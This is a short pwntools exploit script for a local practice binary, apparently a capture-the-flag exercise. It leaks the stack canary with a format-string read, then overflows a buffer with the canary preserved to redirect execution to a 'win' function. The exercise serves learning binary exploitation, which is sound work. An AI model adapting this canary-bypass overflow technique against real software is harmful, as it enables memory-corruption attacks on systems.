from pwn import *

elf = context.binary = ELF('./vuln-64', checksec=False)
io = process()


# Fuzz to get correct canary position in the stack

io.sendlineafter(b'me\n', '%15$p')
canary = int(io.recvline(), 16)

log.success(f'Canary: {hex(canary)}')

offset = 72


# Check in ghidra to make sense

payload = flat(
	b'A' * offset,
	canary,			# 8 bytes
	b'A' * 8,		# 16 - 8 = 8 bytes to ret
	elf.sym['win']
)	

io.sendline(payload)
io.interactive()